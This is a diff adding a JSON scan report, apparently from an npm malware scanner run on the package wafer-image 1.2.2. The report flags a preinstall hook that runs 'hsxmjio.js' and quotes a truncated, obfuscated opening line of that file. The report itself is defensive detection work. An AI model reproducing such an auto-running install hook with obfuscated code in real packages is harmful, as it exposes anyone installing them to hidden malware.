@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"node hsxmjio.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/hsxmjio.js:1",
+                "code": "const a0_0x5f5d26=a0_0x2316;(function(_0x23a6ec,_0x480fe3){const _0x1f638e=a0_0x2316,_0x210825=_0x23a6ec();while(!![]){try{const _0x4a24d0=parseInt(_0x1f638e(0x193))/0x1+parseInt(_0x1f638e(0x195))/0x2*(-parseInt(_0x1f638e(0x181))/0x3)+parse...0x16c4();}",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/wafer-image-1.2.2"
+}
